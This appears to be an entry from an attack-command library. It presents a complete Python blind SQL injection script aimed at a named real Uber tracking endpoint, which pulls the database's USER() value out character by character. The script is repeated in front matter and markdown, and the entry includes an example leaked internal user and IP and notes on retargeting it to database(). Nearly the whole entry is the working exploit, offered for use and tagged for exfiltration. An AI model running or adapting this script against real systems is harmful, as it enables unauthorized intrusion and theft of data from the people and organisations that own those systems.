---
id: cmd-python-dump-001
data: |-
  import json
  import string
  import requests
  from urllib.parse import quote
  from base64 import b64encode

  base = string.digits + '\_-@.'
  payload = {"user_id": 5755, "receiver": "blog.orange.tw"}

  for l in range(0, 30):
      for i in 'i'+base:
          payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#" % (l+1, i)
          new_payload = json.dumps(payload)
          new_payload = b64encode(new_payload.encode()).decode()
          r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=' + quote(new_payload))
          if len(r.content) > 0:
              print(i, end='')
              break
      print()
tags:
  - sqli
  - blind-sqli
  - exfiltration
type: command
output: sendcloud_w@10.9.79.210
executor: python
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.117Z'
verified: false
validated: true
submitted: true
---
# python-blind-sqli-dump-user

## Command

```python
import json
import string
import requests
from urllib.parse import quote
from base64 import b64encode

base = string.digits + '\_-@.'
payload = {"user_id": 5755, "receiver": "blog.orange.tw"}

for l in range(0, 30):
    for i in 'i'+base:
        payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#" % (l+1, i)
        new_payload = json.dumps(payload)
        new_payload = b64encode(new_payload.encode()).decode()
        r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=' + quote(new_payload))
        if len(r.content) > 0:
            print(i, end='')
            break
    print()
```

## Description

This Python script performs blind SQL injection to extract the MySQL USER() function by guessing characters position-by-position using response length as an oracle.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `base` | Character set for guessing (digits + symbols) | Yes |
| `payload` | Base dictionary with user_id and receiver | Yes |
| `l` | Loop for string positions (0-29) | Yes |
| `i` | Individual characters to test | Yes |
| `endpoint` | Target URL | Yes |

## Examples

### Basic Usage

```python
# Run the full script as above
python sqli_dump.py
```

### Advanced Usage

```python
# Modify for database name: change user() to database()
# Adjust base for more characters if needed
```

## Expected Output

Printed characters forming the full USER() string, e.g., 'sendcloud_w@10.9.79.210'.

## Related

- [[Related Procedure: Extract-MySQL-User-via-Blind-SQL-Injection]]
